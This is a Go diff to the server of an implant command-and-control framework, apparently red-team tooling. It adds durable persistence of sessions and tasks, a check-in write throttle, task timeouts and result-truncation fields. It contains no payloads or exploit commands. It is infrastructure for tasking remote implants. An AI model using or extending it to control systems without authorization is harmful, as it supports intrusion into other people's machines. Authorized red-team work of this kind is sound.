@@ -50,11 +50,14 @@ type ImplantSession struct {
 
 // Task represents a pending task for an implant.
 type Task struct {
-	ID        string    `json:"id"`
-	Type      string    `json:"type"`
-	Args      string    `json:"args"`
-	SessionID string    `json:"session_id"`
-	CreatedAt time.Time `json:"created_at"`
+	ID           string    `json:"id"`
+	Type         string    `json:"type"`
+	Args         string    `json:"args"`
+	SessionID    string    `json:"session_id"`
+	ImplantID    string    `json:"implant_id,omitempty"`
+	EngagementID string    `json:"engagement_id,omitempty"`
+	TimeoutMs    int       `json:"timeout_ms,omitempty"`
+	CreatedAt    time.Time `json:"created_at"`
 }
 
 // TaskResult stores a completed task result.
@@ -64,6 +67,8 @@ type TaskResult struct {
 	Success     bool      `json:"success"`
 	Output      string    `json:"output"`
 	Error       string    `json:"error"`
+	Truncated   bool      `json:"truncated,omitempty"`
+	Bytes       int64     `json:"bytes,omitempty"`
 	CompletedAt time.Time `json:"completed_at"`
 }
 
@@ -78,7 +83,16 @@ type ImplantServer struct {
 	// never be able to overwrite another implant's result.
 	taskOwners map[string]string
 	listeners  map[string]*runningListener
+
+	// persist is optional. When set, session/task lifecycle is written through
+	// to durable storage.
+	persist Persistence
+	// lastPersist throttles check-in writes to at most once per session per
+	// persistInterval; the in-memory timestamp is update on every check-in.
+	lastPersist map[string]time.Time
 }
+
+const persistInterval = 5 * time.Second
 
 const (
 	// maxQueueDepth bounds a single session's pending task queue.
@@ -95,6 +109,7 @@ func NewImplantServer() *ImplantServer {
 		taskResults: make(map[string]*TaskResult),
 		taskOwners:  make(map[string]string),
 		listeners:   make(map[string]*runningListener),
+		lastPersist: make(map[string]time.Time),
 	}
 }
 
@@ -172,6 +187,9 @@ func (s *ImplantServer) HandleConnection(conn net.Conn) {
 	}
 	s.mu.Unlock()
 
+	s.persistSessionRegistered(session)
+	s.loadPersistedTasks(sessionID, reg.ImplantID)
+
 	log.Printf("[c2] new session %s from %s (%s@%s, protocol v%d)", sessionID, remoteAddr, reg.Username, reg.Hostname, negotiated)
 
 	// Send register_ack. v1 peers receive only the original fields; unknown
@@ -230,6 +248,7 @@ func (s *ImplantServer) HandleConnection(conn net.Conn) {
 	}
 
 	s.removeSession(sessionID)
+	s.persistSessionDisconnected(sessionID)
 	log.Printf("[c2] session %s disconnected", sessionID)
 }
 
@@ -259,6 +278,7 @@ func (s *ImplantServer) supersedeByImplantID(implantID string) (pending []*Task,
 		if old.conn != nil {
 			_ = old.conn.Close()
 		}
+		s.persistSessionDisconnected(old.ID)
 		log.Printf("[c2] superseded session %s for implant %s", old.ID, implantID)
 	}
 	return pending, lockedBy
@@ -283,13 +303,14 @@ func (s *ImplantServer) handleCheckin(conn net.Conn, sessionID string, data json
 		}
 	}
 
+	now := time.Now()
 	s.mu.Lock()
 	sess, ok := s.sessions[sessionID]
 	if !ok {
 		s.mu.Unlock()
 		return
 	}
-	sess.LastCheckin = time.Now()
+	sess.LastCheckin = now
 
 	// Stateless carriers and v2 peers must present the session token. Legacy
 	// v1 peers have no token and remain supported.
@@ -301,6 +322,12 @@ func (s *ImplantServer) handleCheckin(conn net.Conn, sessionID string, data json
 		}
 	}
 
+	persistCheckin := false
+	if s.persist != nil && now.Sub(s.lastPersist[sessionID]) >= persistInterval {
+		s.lastPersist[sessionID] = now
+		persistCheckin = true
+	}
+
 	// Take the queue, but remember it until the tasking write succeeds. A
 	// failed write used to lose every pending task.
 	pending := s.taskQueues[sessionID]
@@ -310,10 +337,14 @@ func (s *ImplantServer) handleCheckin(conn net.Conn, sessionID string, data json
 	}
 	s.mu.Unlock()
 
+	if persistCheckin {
+		s.persistSessionCheckin(sessionID, now)
+	}
+
 	// Build tasking response.
 	tasks := make([]protocol.TaskWire, 0, len(pending))
 	for _, t := range pending {
-		tasks = append(tasks, protocol.TaskWire{ID: t.ID, Type: t.Type, Args: t.Args})
+		tasks = append(tasks, protocol.TaskWire{ID: t.ID, Type: t.Type, Args: t.Args, TimeoutMs: t.TimeoutMs})
 	}
 
 	tasking := protocol.TaskingData{Tasks: tasks}
@@ -327,7 +358,14 @@ func (s *ImplantServer) handleCheckin(conn net.Conn, sessionID string, data json
 		}
 		s.mu.Unlock()
 		log.Printf("[c2] session %s: failed to send tasking (requeued %d tasks): %v", sessionID, len(pending), err)
+		return
 	}
+
+	ids := make([]string, 0, len(pending))
+	for _, t := range pending {
+		ids = append(ids, t.ID)
+	}
+	s.persistTaskDispatched(ids, now)
 }
 
 func (s *ImplantServer) handleResult(conn net.Conn, sessionID string, data json.RawMessage) {
@@ -357,12 +395,15 @@ func (s *ImplantServer) handleResult(conn net.Conn, sessionID string, data json.
 		Success:     res.Success,
 		Output:      res.Output,
 		Error:       res.Error,
+		Truncated:   res.Truncated,
+		Bytes:       res.Bytes,
 		CompletedAt: time.Now(),
 	}
 	s.taskResults[res.TaskID] = result
 	s.pruneResultsLocked()
 	s.mu.Unlock()
 
+	s.persistTaskCompleted(result)
 	log.Printf("[c2] session %s: result for task %s (success=%v)", sessionID, res.TaskID, res.Success)
 
 	// Send result_ack.
@@ -440,6 +481,7 @@ func (s *ImplantServer) removeSession(sessionID string) {
 func (s *ImplantServer) removeSessionLocked(sessionID string) {
 	delete(s.sessions, sessionID)
 	delete(s.taskQueues, sessionID)
+	delete(s.lastPersist, sessionID)
 	for taskID, owner := range s.taskOwners {
 		if owner == sessionID {
 			delete(s.taskOwners, taskID)
@@ -485,6 +527,7 @@ func (s *ImplantServer) CloseSession(sessionID string) error {
 			log.Printf("[c2] session %s: closing connection: %v", sessionID, err)
 		}
 	}
+	s.persistSessionDisconnected(sessionID)
 	log.Printf("[c2] session %s closed by operator", sessionID)
 	return nil
 }
@@ -525,24 +568,44 @@ func (s *ImplantServer) QueueTask(sessionID, taskType, args string) (string, err
 	}
 
 	s.mu.Lock()
-	defer s.mu.Unlock()
-
-	if _, ok := s.sessions[sessionID]; !ok {
+	sess, ok := s.sessions[sessionID]
+	if !ok {
+		s.mu.Unlock()
 		return "", fmt.Errorf("%w: %s", ErrSessionNotFound, sessionID)
 	}
 	if len(s.taskQueues[sessionID]) >= maxQueueDepth {
+		s.mu.Unlock()
 		return "", fmt.Errorf("%w for session %s", ErrTaskQueueFull, sessionID)
 	}
 
 	task := &Task{
-		ID:        uuid.New().String(),
-		Type:      taskType,
-		Args:      args,
-		SessionID: sessionID,
-		CreatedAt: time.Now(),
+		ID:           uuid.New().String(),
+		Type:         taskType,
+		Args:         args,
+		SessionID:    sessionID,
+		ImplantID:    sess.ImplantID,
+		EngagementID: sess.EngagementID,
+		CreatedAt:    time.Now(),
 	}
 
 	s.taskQueues[sessionID] = append(s.taskQueues[sessionID], task)
+	s.mu.Unlock()
+
+	// Queueing is fail-closed: a task that cannot be persisted is not
+	// accepted, so the operator never sees a task that only exists in memory.
+	if err := s.persistTaskQueued(task); err != nil {
+		s.mu.Lock()
+		queue := s.taskQueues[sessionID]
+		for i, queued := range queue {
+			if queued.ID == task.ID {
+				s.taskQueues[sessionID] = append(queue[:i], queue[i+1:]...)
+				break
+			}
+		}
+		s.mu.Unlock()
+		return "", fmt.Errorf("persist task: %w", err)
+	}
+
 	log.Printf("[c2] queued task %s (%s) for session %s", task.ID, taskType, sessionID)
 	return task.ID, nil
 }
